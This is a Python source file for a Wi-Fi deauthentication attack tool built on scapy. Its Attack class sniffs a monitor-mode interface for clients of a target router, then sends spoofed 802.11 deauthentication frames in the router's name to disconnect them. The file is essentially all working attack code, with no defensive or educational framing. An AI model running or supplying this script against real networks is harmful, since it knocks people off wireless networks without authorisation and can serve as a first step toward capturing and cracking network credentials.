from scapy.all import *
import colors

class Attack(object):
	"""docstring for Attack"""
	def __init__(self, targetRouterMac):
		self.clients = []
		self.interface = "wlan0mon"
		self.targetRouterMac = targetRouterMac
	def start(self):
		t = AsyncSniffer(prn=self.find_clients, iface=self.interface)
		t.start()
		
		self.search_client()
		t.stop()

	def search_client(self):
		print(colors.O + "[+]" + colors.W + " Searching for clients...")
		while True:
			if( len(self.clients) != 0 ):
				print(colors.B + "[+]" + colors.W +" Found 1 client")
				self.deauth_clients()
				break

	def deauth_clients(self):
		for i in self.clients:
			print(colors.O + "[+]" + colors.W + " Sending Deauth packet to " + colors.GR + str(i) + colors.W)
			self.deauth(i)
	def deauth(self,client):
		packet = RadioTap() / \
         Dot11(type=0,         # Management type
               subtype=12,     # Deauthentication subtype
               addr1=client,
               addr2=self.targetRouterMac,
               addr3=self.targetRouterMac) / \
         Dot11Deauth(reason=7) # "Class 3 frame received from nonassociated STA."

         # sending the deauth packet
		sendp(packet, iface=self.interface)
		print(colors.O + "[+]" + colors.W + " Deauthenticating ",client)
	def find_clients(self,p):
		if p.haslayer(Dot11):
			if p.addr1 and p.addr2:                  # if "from" and "to" mac addr. exists
				p.addr1 = p.addr1.lower()            # convert both macs to all lower case     
				p.addr2 = p.addr2.lower()         
				if self.targetRouterMac.lower() == p.addr1.lower(): # AP's mac address = packt destination mac !
					if p.type in [1, 2]:             # the type I'm looking for
						if p.addr2 not in self.clients and p.addr2 != '':
							self.clients.append(p.addr2)
		